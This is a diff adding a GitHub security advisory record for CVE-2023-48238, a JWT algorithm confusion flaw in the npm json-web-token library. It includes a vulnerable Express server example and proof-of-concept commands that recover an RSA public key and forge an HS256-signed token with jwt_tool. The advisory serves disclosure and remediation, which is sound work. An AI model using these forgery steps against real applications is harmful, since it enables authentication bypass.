@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-4xw9-cx39-r355",
+  "modified": "2023-11-20T22:06:44Z",
+  "published": "2023-11-17T22:48:15Z",
+  "aliases": [
+    "CVE-2023-48238"
+  ],
+  "summary": "json-web-token library is vulnerable to a JWT algorithm confusion attack",
+  "details": "### Summary\nThe json-web-token library is vulnerable to a JWT algorithm confusion attack.\n\n### Details\nOn line 86 of the 'index.js' file, the algorithm to use for verifying the signature of the JWT token is taken from the JWT token, which at that point is still unverified and thus shouldn't be trusted. To exploit this vulnerability, an attacker needs to craft a malicious JWT token containing the HS256 algorithm, signed with the public RSA key of the victim application. This attack will only work against this library is the RS256 algorithm is in use, however it is a best practice to use that algorithm.\n\n### PoC\nTake a server running the following code:\n```javascript\nconst express = require('express');\nconst jwt = require('json-web-token');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\nconst port = 3000;\n\n// Load the keys from the file\nconst publicKeyPath = path.join(__dirname, 'public-key.pem');\nconst publicKey = fs.readFileSync(publicKeyPath, 'utf8');\nconst privateKeyPath = path.join(__dirname, 'private-key.pem');\nconst privateKey = fs.readFileSync(privateKeyPath, 'utf8');\n\napp.use(express.json());\n\n// Endpoint to generate a JWT token with admin: False\napp.get('/generateToken', async (req, res) => {\n  const payload = { admin: false, name: req.query.name };\n  const token = await jwt.encode(privateKey, payload, 'RS256', function (err, token) {\n    res.json({ token });\n  });\n});\n\n// Middleware to verify the JWT token\nfunction verifyToken(req, res, next) {\n  const token = req.query.token;\n\n  jwt.decode(publicKey, token, (err, decoded) => {\n    if (err) {\n      console.log(err)\n      return res.status(401).json({ message: 'Token authentication failed' });\n    }\n\n    req.decoded = decoded;\n    next();\n  });\n}\n\n// Endpoint to check if you are the admin or not\napp.get('/checkAdmin', verifyToken, (req, res) => {\n  res.json(req.decoded);\n});\n\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\n**Public key recovery**\nFirst, an attacker needs to recover the public key from the server in any way possible. It is possible to extract this from just two JWT tokens as shown below.\nGrab two different JWT tokens and utilize the following tool: `https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py`\n```\npython3 jwt_forgery.py token1 token2\n```\nThe tool will generate 4 different public keys, all in different formats. Try the following for all 4 formats.\n\n**Algorithm confusion**\nChange the JWT to the HS256 algorithm and modify any of the contents to your liking at `https://jwt.io/`.\nCopy the resulting JWT token and use with the following tool: `https://github.com/ticarpi/jwt_tool`.\n```\npython /opt/jwt_tool/jwt_tool.py --exploit k -pk public_key token\n```\nYou will now get a resulting JWT token that is validly signed.\n\n### Impact\nApplications using the RS256 algorithm, are vulnerable to this algorithm confusion attack which allows attackers to sign arbitrary payloads that the verifier will accept.\n\n### Solution\nEither one of the following solutions will work.\n1. Change the signature of the `decode` function to ensure that the algorithm is set in that call\n2. Check whether or not the secret could be a public key in the decode function and in that case, set the key to be a public key.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "json-web-token"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "3.1.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/joaquimserafim/json-web-token/security/advisories/GHSA-4xw9-cx39-r355"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-48238"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/joaquimserafim/json-web-token"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/joaquimserafim/json-web-token/blob/acf6a462471e1b14187eb77414e9161b8b7bff7e/index.js#L86"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-20",
+      "CWE-345"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-11-17T22:48:15Z",
+    "nvd_published_at": "2023-11-17T22:15:07Z"
+  }
+}
